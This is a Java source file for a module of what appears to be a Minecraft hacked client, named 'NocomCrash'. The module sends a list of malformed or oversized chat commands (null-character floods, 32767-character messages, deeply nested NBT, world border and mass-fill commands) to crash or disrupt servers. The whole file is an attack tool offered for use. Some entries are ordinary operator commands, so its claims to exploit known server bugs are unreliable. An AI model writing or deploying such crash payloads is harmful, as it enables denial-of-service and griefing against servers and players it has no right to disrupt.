package com.claudemc.module.impl.misc;

import com.claudemc.module.Category;
import com.claudemc.module.Module;
import net.minecraft.client.MinecraftClient;
import net.minecraft.text.Text;

/**
 * NocomCrash: Attempts to crash servers using known malformed command patterns
 * that exploit bugs in older server software.
 */
public class NocomCrash extends Module {

    public static NocomCrash INSTANCE;

    private int phase = 0;
    private int tickDelay = 0;

    // Known crash-inducing command patterns for older server versions
    private static final String[] CRASH_COMMANDS = {
        "say " + "\u0000".repeat(1000),
        "tell @a " + "A".repeat(32767),
        "scoreboard objectives add " + "A".repeat(16) + " dummy " + "§".repeat(100),
        "data merge block 0 0 0 {" + "a:".repeat(500) + "}",
        "execute at @e[type=armor_stand] run say hi",
        "worldborder set 1",
        "fill ~-128 0 ~-128 ~128 255 ~128 stone",
    };

    public NocomCrash() {
        super("NocomCrash", "Sends malformed commands to crash vulnerable servers", Category.EXPLOIT);
        INSTANCE = this;
        addBool("AllAtOnce", false);
        addNumber("DelayTicks", 5, 1, 40, 1, true);
    }

    @Override
    public void onEnable() {
        phase = 0;
        tickDelay = 0;
    }

    @Override
    public void onDisable() {
        phase = 0;
        tickDelay = 0;
    }

    @Override
    public void onTick(MinecraftClient mc) {
        if (mc.player == null || mc.getNetworkHandler() == null) return;

        boolean allAtOnce = Boolean.parseBoolean(getSetting("AllAtOnce"));
        int delay = parseInt(getSetting("DelayTicks"), 5);

        if (allAtOnce) {
            // Send all crash commands at once
            for (String cmd : CRASH_COMMANDS) {
                try {
                    mc.getNetworkHandler().sendChatCommand(cmd);
                } catch (Exception ignored) {}
            }
            mc.player.sendMessage(Text.literal("§c[NocomCrash] All crash payloads sent."), false);
            setEnabled(false);
            return;
        }

        if (++tickDelay < delay) return;
        tickDelay = 0;

        if (phase >= CRASH_COMMANDS.length) {
            mc.player.sendMessage(Text.literal("§c[NocomCrash] All payloads exhausted."), false);
            setEnabled(false);
            return;
        }

        try {
            mc.getNetworkHandler().sendChatCommand(CRASH_COMMANDS[phase]);
            mc.player.sendMessage(Text.literal("§c[NocomCrash] Sent payload " + (phase + 1) + "/" + CRASH_COMMANDS.length), false);
        } catch (Exception e) {
            mc.player.sendMessage(Text.literal("§c[NocomCrash] Error: " + e.getMessage()), false);
        }
        phase++;
    }

    private int parseInt(String s, int d) {
        try { return (int) Double.parseDouble(s); } catch (Exception e) { return d; }
    }
}
